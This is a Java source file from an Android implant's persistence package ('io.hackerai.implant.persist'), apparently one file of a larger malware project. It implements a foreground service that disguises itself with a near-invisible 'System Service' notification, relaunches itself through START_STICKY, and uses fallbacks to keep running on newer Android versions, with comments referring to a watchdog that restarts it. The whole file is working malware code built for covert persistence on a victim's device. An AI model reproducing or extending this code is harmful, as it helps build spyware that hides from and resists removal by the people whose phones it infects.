// ============================================================
// FILE 8: persist/ServiceCore.java
// ============================================================
package io.hackerai.implant.persist;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;
import androidx.core.app.ServiceCompat;

import java.util.concurrent.atomic.AtomicBoolean;

/**
 * ServiceCore — foreground service with START_STICKY.
 *
 * - Runs with a low-profile notification (channel "implant-svc").
 * - If killed by the system, START_STICKY ensures immediate relaunch.
 * - On Android 14+ declares foregroundServiceType="specialUse"
 *   (or "dataSync" as fallback) with matching permission.
 * - Monitors its own liveness for PersistenceMatrix watchdogs.
 */
public class ServiceCore extends Service {
    private static final String TAG = "ServiceCore";
    private static final int NOTIFY_ID = 0x1001;
    private static final String CHANNEL_ID = "implant-svc";
    private static final String CHANNEL_NAME = "Implant Service";

    private static final AtomicBoolean running = new AtomicBoolean(false);

    public static boolean isRunning() { return running.get(); }

    @Override
    public void onCreate() {
        super.onCreate();
        running.set(true);
        Log.d(TAG, "ServiceCore created.");
        startForegroundWithNotification();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "onStartCommand — START_STICKY engaged.");
        running.set(true);
        startForegroundWithNotification();
        return START_STICKY;  // <-- KILL => RELAUNCH
    }

    private void startForegroundWithNotification() {
        createNotificationChannel();

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();

        // Android 14+ requires foregroundServiceType matching manifest declaration
        int fgsType = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            // Use specialUse as catch-all; fallback to dataSync if not available
            try {
                ServiceCompat.startForeground(
                        this, NOTIFY_ID, notification,
                        fgsType
                );
            } catch (Exception e) {
                Log.w(TAG, "specialUse FGS failed, trying dataSync", e);
                try {
                    ServiceCompat.startForeground(
                            this, NOTIFY_ID, notification,
                            android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                    );
                } catch (Exception e2) {
                    Log.e(TAG, "FGS start failed entirely", e2);
                    startForeground(NOTIFY_ID, notification);
                }
            }
        } else {
            startForeground(NOTIFY_ID, notification);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel chan = new NotificationChannel(
                    CHANNEL_ID, CHANNEL_NAME,
                    NotificationManager.IMPORTANCE_MIN
            );
            chan.setShowBadge(false);
            chan.setSound(null, null);
            chan.enableVibration(false);
            NotificationManager mgr = getSystemService(NotificationManager.class);
            if (mgr != null) mgr.createNotificationChannel(chan);
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        running.set(false);
        Log.d(TAG, "ServiceCore destroyed.");
        super.onDestroy();
        // PersistenceMatrix watchdog will restart
    }
}
